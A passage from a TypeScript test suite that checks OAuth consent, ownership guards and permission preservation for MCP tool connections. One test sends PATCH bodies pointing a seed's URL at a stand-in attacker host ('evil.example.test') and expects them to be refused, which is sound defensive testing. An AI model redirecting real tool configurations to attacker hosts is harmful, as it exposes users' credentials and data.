      expect(await installsOf(instanceId)).toHaveLength(0);
      expect(await db.select().from(toolProfileBindings).where(eq(toolProfileBindings.companyId, company.id))).toHaveLength(0);
    });

    it("a wrong-user or revoked-member callback persists nothing: consent state stays bound to its owner", async () => {
      const fixture = installMcpOAuthFixture({ auth: "oauth", tools: GOOGLE_TOOLS });
      const company = await createCompany(db);
      await seedOauthSeeds(company.id);
      const seed = (await googleSeed(company.id))!;
      const alice = await addHumanMember(company.id);
      const bob = await addHumanMember(company.id);

      const start = await startSeedConnect(company.id, seed.id, alice);
      const instanceId = start.body.connectionId as string;
      const authorizationUrl = start.body.authorizationUrl as string;

      // Bob tries to complete Alice's consent: 403, and no grant appears for anyone.
      const bobCallback = await completeSeedConnect(company.id, bob, authorizationUrl, fixture);
      expect(bobCallback.status).toBe(403);
      expect(await grantsOf(instanceId)).toHaveLength(0);

      // Alice's membership is revoked between start and callback: the callback is refused
      // and no grant, token, or credential is persisted.
      await db.update(companyMemberships)
        .set({ status: "suspended" })
        .where(and(eq(companyMemberships.companyId, company.id), eq(companyMemberships.principalId, alice)));
      const revokedCallback = await completeSeedConnect(company.id, alice, authorizationUrl, fixture, { status: "suspended" });
      expect(revokedCallback.status).toBe(403);
      expect(await grantsOf(instanceId)).toHaveLength(0);
      expect(await db.select().from(companySecrets).where(eq(companySecrets.companyId, company.id))).toHaveLength(0);
      expect(await db.select().from(secretAccessEvents)).toHaveLength(0);

      // Restore Alice: her own callback completes normally, on her own instance only.
      await db.update(companyMemberships)
        .set({ status: "active" })
        .where(and(eq(companyMemberships.companyId, company.id), eq(companyMemberships.principalId, alice)));
      const aliceCallback = await completeSeedConnect(company.id, alice, authorizationUrl, fixture);
      expect(aliceCallback.status).toBe(200);
      expect(await grantsOf(instanceId)).toEqual([
        expect.objectContaining({ kind: "user", subjectUserId: alice }),
      ]);
    });

    it("install guards: a revoked owner and a non-owner member cannot install; the owner can, and can remove", async () => {
      const fixture = installMcpOAuthFixture({ auth: "oauth", tools: GOOGLE_TOOLS });
      const company = await createCompany(db);
      await seedOauthSeeds(company.id);
      const seed = (await googleSeed(company.id))!;
      const alice = await addHumanMember(company.id);
      const bob = await addHumanMember(company.id);
      const [agent] = await db.insert(agents).values({
        companyId: company.id, name: "Install target", role: "engineer", status: "active", adapterType: "process", adapterConfig: {}, runtimeConfig: {},
      }).returning();

      const start = await startSeedConnect(company.id, seed.id, alice);
      const instanceId = start.body.connectionId as string;
      expect((await completeSeedConnect(company.id, alice, start.body.authorizationUrl, fixture)).status).toBe(200);

      // Bob (an active member, not the owner) cannot add the install — not even with
      // tools:manage_connections: the service-level owner gate refuses him.
      stubPublicUrl();
      const bobApp = createActorApp(sessionActor(company.id, bob));
      const plainBob = await request(bobApp)
        .put(`/api/tool-connections/${instanceId}/installs`)
        .send({ installs: [{ targetType: "agent", targetId: agent!.id }] });
      expect(plainBob.status).toBe(403);
      await db.insert(principalPermissionGrants).values([
        {
          companyId: company.id,
          principalType: "user",
          principalId: bob,
          permissionKey: "tools:manage_connections",
          scope: null,
        },
        {
          companyId: company.id,
          principalType: "user",
          principalId: bob,
          permissionKey: "agents:configure",
          scope: null,
        },
      ]);
      const managerBob = await request(bobApp)
        .put(`/api/tool-connections/${instanceId}/installs`)
        .send({ installs: [{ targetType: "agent", targetId: agent!.id }] });
      expect(managerBob.status).toBe(403);
      expect(managerBob.body.details).toMatchObject({ code: "personal_instance_owner_required" });
      expect(await installsOf(instanceId)).toHaveLength(0);

      // Alice's membership is revoked: she cannot install either (and no row appears).
      await db.update(companyMemberships)
        .set({ status: "suspended" })
        .where(and(eq(companyMemberships.companyId, company.id), eq(companyMemberships.principalId, alice)));
      const revokedApp = createActorApp(sessionActor(company.id, alice, { status: "suspended" }));
      await request(revokedApp)
        .put(`/api/tool-connections/${instanceId}/installs`)
        .send({ installs: [{ targetType: "agent", targetId: agent!.id }] })
        .expect(403);
      expect(await installsOf(instanceId)).toHaveLength(0);

      // Restored, the owner installs and then removes. The route additionally requires
      // agent_config:update for the target agent, so Alice holds agents:configure.
      await db.update(companyMemberships)
        .set({ status: "active" })
        .where(and(eq(companyMemberships.companyId, company.id), eq(companyMemberships.principalId, alice)));
      await db.insert(principalPermissionGrants).values({
        companyId: company.id,
        principalType: "user",
        principalId: alice,
        permissionKey: "agents:configure",
        scope: null,
      });
      const aliceApp = createActorApp(sessionActor(company.id, alice));
      await request(aliceApp)
        .put(`/api/tool-connections/${instanceId}/installs`)
        .send({ installs: [{ targetType: "agent", targetId: agent!.id }] })
        .expect(200);
      expect(await installsOf(instanceId)).toHaveLength(1);
      await request(aliceApp)
        .put(`/api/tool-connections/${instanceId}/installs`)
        .send({ installs: [] })
        .expect(200);
      expect(await installsOf(instanceId)).toHaveLength(0);
    });

    it("an archived own instance is revived by an explicit Connect with its grants, credentials, and reviews intact", async () => {
      const fixture = installMcpOAuthFixture({ auth: "oauth", tools: GOOGLE_TOOLS });
      const company = await createCompany(db);
      await seedOauthSeeds(company.id);
      const seed = (await googleSeed(company.id))!;
      const alice = await addHumanMember(company.id);

      const start = await startSeedConnect(company.id, seed.id, alice);
      const instanceId = start.body.connectionId as string;
      expect((await completeSeedConnect(company.id, alice, start.body.authorizationUrl, fixture)).status).toBe(200);
      const grantBefore = (await grantsOf(instanceId))[0]!;
      const catalogBefore = await catalogOf(instanceId);
      const instanceBefore = (await db.select().from(toolConnections).where(eq(toolConnections.id, instanceId)))[0]!;

      // The owner archives their own instance (allowed), then reconnects via the seed.
      stubPublicUrl();
      const aliceApp = createActorApp(sessionActor(company.id, alice));
      await request(aliceApp).patch(`/api/tool-connections/${instanceId}`).send({ status: "archived" }).expect(200);
      const restart = await startSeedConnect(company.id, seed.id, alice);
      expect(restart.status).toBe(200);
      expect(restart.body.connectionId).toBe(instanceId); // revived in place, not a new row

      const instanceAfter = (await db.select().from(toolConnections).where(eq(toolConnections.id, instanceId)))[0]!;
      expect(instanceAfter.status).toBe("draft");
      expect(instanceAfter.config).toEqual(instanceBefore.config);
      expect(instanceAfter.credentialSecretRefs).toEqual(instanceBefore.credentialSecretRefs);
      expect(await grantsOf(instanceId)).toEqual([grantBefore]); // no re-mint, no wipe
      expect(await catalogOf(instanceId)).toEqual(catalogBefore); // owner-reviewed choices preserved
      const rows = await db.select().from(toolConnections).where(and(eq(toolConnections.companyId, company.id), eq(toolConnections.uid, `rh-google-mcp/default-mcp-personal/${alice}`)));
      expect(rows).toHaveLength(1);
    });

    it("the internal OAuth producer stamps client binding on the instance while the public surface cannot mutate the seed", async () => {
      const fixture = installMcpOAuthFixture({ auth: "oauth", tools: GOOGLE_TOOLS });
      const company = await createCompany(db);
      await seedOauthSeeds(company.id);
      const seed = (await googleSeed(company.id))!;
      const alice = await addHumanMember(company.id);

      const start = await startSeedConnect(company.id, seed.id, alice);
      expect(start.status).toBe(200);
      const instanceId = start.body.connectionId as string;

      // The trusted OAuth registration path stamped the client binding on the INSTANCE.
      const instance = (await db.select().from(toolConnections).where(eq(toolConnections.id, instanceId)))[0]!;
      const oauth = (instance.config as Record<string, unknown>).oauth as Record<string, unknown>;
      expect(oauth).toMatchObject({ clientRedirectUri: REDIRECT_URI, clientCompanyId: company.id });

      // The public PATCH cannot exfiltrate or mutate the SEED: every field is 409.
      stubPublicUrl();
      const managerApp = createActorApp({
        type: "board", userId: "board-user", userName: "Board User", userEmail: null,
        isInstanceAdmin: true, source: "local_implicit", companyIds: [company.id],
        memberships: [{ companyId: company.id, status: "active", membershipRole: "admin" }],
      });
      for (const body of [
        { config: { url: "https://evil.example.test/mcp" } },
        { transportConfig: { url: "https://evil.example.test/mcp" } },
        { authKind: "api_key" },
        { credentialPolicy: "shared" },
        { transport: "local_stdio" },
        { enabled: true },
        { name: "Renamed seed" },
        { credentialSecretRefs: [{ secretId: randomUUID(), configPath: "oauth.access_token" }] },
      ]) {
        const response = await request(managerApp).patch(`/api/tool-connections/${seed.id}`).send(body);
        expect(response.status).toBe(409);
        expect(response.body.details).toMatchObject({ code: "managed_seed_immutable" });
      }
      const seedAfter = (await googleSeed(company.id))!;
      expect(seedAfter.config).toEqual(seed.config);
      expect(seedAfter.enabled).toBe(false);
    });

    it("H2: a reconnect (re-consent) preserves the owner's denied permissions and never re-runs the initial RH five-tool activation", async () => {
      const fixture = installMcpOAuthFixture({ auth: "oauth", tools: RH_ALL_TOOLS });
      const company = await createCompany(db);
      await seedOauthSeeds(company.id);
      const seed = (await rhSeed(company.id))!;
      const alice = await addHumanMember(company.id);
      const [agent] = await db.insert(agents).values({
        companyId: company.id, name: "Reconnect target", role: "engineer", status: "active", adapterType: "process", adapterConfig: {}, runtimeConfig: {},
      }).returning();

      // Initial consent: the five Granola read tools are activated, everything else quarantined.
      const firstStart = await startSeedConnect(company.id, seed.id, alice);
      expect(firstStart.status).toBe(200);
      const instanceId = firstStart.body.connectionId as string;
      expect((await completeSeedConnect(company.id, alice, firstStart.body.authorizationUrl, fixture)).status).toBe(200);
      const catalogAfterFirst = await catalogOf(instanceId);
      const ceilingEntries = catalogAfterFirst.filter((entry) => RH_CEILING_TOOLS.includes(entry.toolName));
      expect(ceilingEntries.every((entry) => entry.status === "active")).toBe(true);

      // The owner's explicit review: the agent gets only FOUR of the five ceiling tools
      // (the fifth is a deliberate denial), and every quarantined tool is decided.
      stubPublicUrl();
      const aliceApp = createActorApp(sessionActor(company.id, alice));
      const finish = await request(aliceApp)
        .post(`/api/companies/${company.id}/tools/apps/${instanceId}/finish`)
        .send({
          enabledCatalogEntryIds: ceilingEntries.slice(0, 4).map((entry) => entry.id),
          askFirstCatalogEntryIds: [],
          reviewedCatalogEntryIds: catalogAfterFirst.filter((entry) => entry.status === "quarantined").map((entry) => entry.id),
          access: { agentIds: [agent!.id] },
        });
      expect(finish.status).toBe(200);
      const deniedCeilingTool = ceilingEntries[4]!.toolName;
      const profileEntriesBefore = await db
        .select()
        .from(toolProfileEntries)
        .where(eq(toolProfileEntries.companyId, company.id));
      expect(profileEntriesBefore.map((entry) => entry.catalogEntryId).sort()).toEqual(
        ceilingEntries.slice(0, 4).map((entry) => entry.id).sort(),
      );
      const bindingsBefore = await db.select().from(toolProfileBindings).where(eq(toolProfileBindings.companyId, company.id));

      // Reconnect: the owner re-consents (new tokens, same instance).
      const reconnect = await startSeedConnect(company.id, seed.id, alice);
      expect(reconnect.status).toBe(200);
      expect(reconnect.body.connectionId).toBe(instanceId);
      expect((await completeSeedConnect(company.id, alice, reconnect.body.authorizationUrl, fixture)).status).toBe(200);

      // The denied choices are preserved exactly: the fifth ceiling tool is NOT restored into
      // the profile, no beyond-ceiling tool is added, and no new install or binding appears.
      const profileEntriesAfter = await db
        .select()
        .from(toolProfileEntries)
        .where(eq(toolProfileEntries.companyId, company.id));
      expect(profileEntriesAfter.map((entry) => entry.catalogEntryId).sort()).toEqual(
        profileEntriesBefore.map((entry) => entry.catalogEntryId).sort(),
      );
      const deniedCeilingEntryId = catalogAfterFirst.find((entry) => entry.toolName === deniedCeilingTool)!.id;
      expect(profileEntriesAfter.map((entry) => entry.catalogEntryId)).not.toContain(deniedCeilingEntryId);
      const bindingsAfter = await db.select().from(toolProfileBindings).where(eq(toolProfileBindings.companyId, company.id));
      expect(bindingsAfter).toEqual(bindingsBefore);
      expect(await installsOf(instanceId)).toHaveLength(0);
      // The re-consent kept exactly Alice's own user grant (refreshed, never duplicated).
      expect(await grantsOf(instanceId)).toEqual([
        expect.objectContaining({ kind: "user", subjectUserId: alice }),
      ]);
    });

    it("B2: an archived-then-revived instance completes its REAL OAuth callback without wiping the owner-reviewed choices", async () => {
      const fixture = installMcpOAuthFixture({ auth: "oauth", tools: RH_ALL_TOOLS });
      const company = await createCompany(db);
      await seedOauthSeeds(company.id);
      const seed = (await rhSeed(company.id))!;
      const alice = await addHumanMember(company.id);
      const [agent] = await db.insert(agents).values({
        companyId: company.id, name: "Revive target", role: "engineer", status: "active", adapterType: "process", adapterConfig: {}, runtimeConfig: {},
      }).returning();

      // Initial consent (five ceiling tools activated), then the owner's review:
      // the agent gets only four of the five (the fifth is a deliberate denial).
      const firstStart = await startSeedConnect(company.id, seed.id, alice);
      expect(firstStart.status).toBe(200);
      const instanceId = firstStart.body.connectionId as string;
      expect((await completeSeedConnect(company.id, alice, firstStart.body.authorizationUrl, fixture)).status).toBe(200);
      const catalog = await catalogOf(instanceId);
      const ceilingRows = catalog.filter((entry) => RH_CEILING_TOOLS.includes(entry.toolName));
      stubPublicUrl();
      const aliceApp = createActorApp(sessionActor(company.id, alice));
      const finish = await request(aliceApp)
        .post(`/api/companies/${company.id}/tools/apps/${instanceId}/finish`)
        .send({
          enabledCatalogEntryIds: ceilingRows.slice(0, 4).map((entry) => entry.id),
          askFirstCatalogEntryIds: [],
          reviewedCatalogEntryIds: catalog.filter((entry) => entry.status === "quarantined").map((entry) => entry.id),
          access: { agentIds: [agent!.id] },
        });
      expect(finish.status).toBe(200);

      // Snapshot every owner-reviewed choice before archiving.
      const profileRowsBefore = await db
        .select()
        .from(toolProfiles)
        .where(and(eq(toolProfiles.companyId, company.id), eq(toolProfiles.profileKey, `app:${instanceId}`)));
      const entriesBefore = await db
        .select()
        .from(toolProfileEntries)
        .where(eq(toolProfileEntries.companyId, company.id));
      const bindingsBefore = await db
        .select()
        .from(toolProfileBindings)
        .where(eq(toolProfileBindings.companyId, company.id));
      const catalogBefore = await catalogOf(instanceId);

      // The owner archives their own instance, then reconnects: the seed start revives
      // the SAME row to draft, and the REAL callback completes on it.
      await request(aliceApp).patch(`/api/tool-connections/${instanceId}`).send({ status: "archived" }).expect(200);
      const restart = await startSeedConnect(company.id, seed.id, alice);
      expect(restart.status).toBe(200);
      expect(restart.body.connectionId).toBe(instanceId);
      const revivedRow = (await db.select().from(toolConnections).where(eq(toolConnections.id, instanceId)))[0]!;
      expect(revivedRow.status).toBe("draft");
      const callback = await completeSeedConnect(company.id, alice, restart.body.authorizationUrl, fixture);
      expect(callback.status).toBe(200);

      // The connection and application are active/enabled again (set before the early return)…
      const afterRow = (await db.select().from(toolConnections).where(eq(toolConnections.id, instanceId)))[0]!;
      expect(afterRow.status).toBe("active");
      expect(afterRow.enabled).toBe(true);
      const [appRow] = await db.select().from(toolApplications).where(eq(toolApplications.id, afterRow.applicationId));
      expect(appRow!.status).toBe("active");
      // …and every owner-reviewed choice survived the callback untouched:
      // profile (same id), entries, bindings, installs, and catalog statuses.
      const profileRowsAfter = await db
        .select()
        .from(toolProfiles)
        .where(and(eq(toolProfiles.companyId, company.id), eq(toolProfiles.profileKey, `app:${instanceId}`)));
      expect(profileRowsAfter).toEqual(profileRowsBefore);
      expect(await db.select().from(toolProfileEntries).where(eq(toolProfileEntries.companyId, company.id))).toEqual(entriesBefore);
      expect(await db.select().from(toolProfileBindings).where(eq(toolProfileBindings.companyId, company.id))).toEqual(bindingsBefore);
      // Catalog statuses and review stamps are preserved exactly (only the
      // refresh's lastSeenAt touch differs): no first-five restoration.
      const catalogAfter = await catalogOf(instanceId);
      expect(catalogAfter.map((entry) => [entry.toolName, entry.status, entry.reviewedAt === null])).toEqual(
        catalogBefore.map((entry) => [entry.toolName, entry.status, entry.reviewedAt === null]),
      );
      expect(await installsOf(instanceId)).toHaveLength(0);
      expect(await grantsOf(instanceId)).toEqual([
        expect.objectContaining({ kind: "user", subjectUserId: alice }),
      ]);
    });

    it("S6: a profile created between the pre-network snapshot and the finish transaction is left untouched (same id, explicit deny, no writes)", async () => {
      // The tools/list barrier fires mid-callback: AFTER the profileExisted snapshot,
      // BEFORE the finish transaction — exactly the race the initializer must survive.
      const company = await createCompany(db);
      let instanceIdForGate = "";
      const fixture = installMcpOAuthFixture({
        auth: "oauth",
        tools: RH_ALL_TOOLS,
        toolsListGate: async () => {
          if (!instanceIdForGate) return;
          const [competing] = await db
            .insert(toolProfiles)
            .values({
              companyId: company.id,
              profileKey: `app:${instanceIdForGate}`,
              name: "Race-created profile",
              status: "active",
              defaultAction: "deny",
              metadata: { source: "race" },
            })
            .returning();
          // An explicit deny choice for a race-created catalog entry (the competing
          // writer's own row: the discovered catalog is not even inserted yet).
          const [raceCatalogEntry] = await db
            .insert(toolCatalogEntries)
            .values({
              companyId: company.id,
              applicationId: seed.applicationId,
              connectionId: instanceIdForGate,
              entryKind: "tool",
              name: "race_tool",
              toolName: "race_tool",
              title: "Race tool",
              riskLevel: "read",
              isReadOnly: true,
              status: "quarantined",
              versionHash: randomUUID(),
              schemaHash: randomUUID(),
            })
            .returning();
          await db.insert(toolProfileEntries).values({
            companyId: company.id,
            profileId: competing!.id,
            selectorType: "catalog_entry",
            effect: "deny",
            catalogEntryId: raceCatalogEntry!.id,
          });
        },
      });
      await seedOauthSeeds(company.id);
      const seed = (await rhSeed(company.id))!;
      const alice = await addHumanMember(company.id);

      const start = await startSeedConnect(company.id, seed.id, alice);
      expect(start.status).toBe(200);
      instanceIdForGate = start.body.connectionId as string;
      const callback = await completeSeedConnect(company.id, alice, start.body.authorizationUrl, fixture);
      expect(callback.status).toBe(200);

      const responseCatalog = (callback.body as { catalog: ToolCatalogEntry[] }).catalog;
      expect(responseCatalog.every((entry) => entry.status === "quarantined")).toBe(true);

      // The initializer skipped ALL catalog/profile permission writes and returned the
      // SAME profile id: the race-created profile is untouched, its explicit deny entry
      // is preserved, nothing was enabled, bound, or installed.
      const profileRows = await db
        .select()
        .from(toolProfiles)
        .where(and(eq(toolProfiles.companyId, company.id), eq(toolProfiles.profileKey, `app:${instanceIdForGate}`)));
      expect(profileRows).toHaveLength(1);
      expect(profileRows[0]!).toMatchObject({ name: "Race-created profile", defaultAction: "deny" });
      const raceEntries = await db
        .select()
        .from(toolProfileEntries)
        .where(eq(toolProfileEntries.profileId, profileRows[0]!.id));
      expect(raceEntries).toHaveLength(1);
      expect(raceEntries[0]!.effect).toBe("deny");
      // No five-tool initialization happened, no bindings, no installs, and every
      // discovered tool stayed quarantined (no catalog permission writes at all).
      const catalog = await catalogOf(instanceIdForGate);
      expect(catalog.every((entry) => entry.status === "quarantined")).toBe(true);
      expect(await db.select().from(toolProfileBindings).where(eq(toolProfileBindings.companyId, company.id))).toHaveLength(0);
      expect(await installsOf(instanceIdForGate)).toHaveLength(0);
      // The callback still landed the owner's grant and activated the connection.
      expect(await grantsOf(instanceIdForGate)).toEqual([
        expect.objectContaining({ kind: "user", subjectUserId: alice }),
      ]);
      const [row] = await db.select().from(toolConnections).where(eq(toolConnections.id, instanceIdForGate));
      expect(row!.status).toBe("active");
      expect(row!.enabled).toBe(true);
    });
  });

});
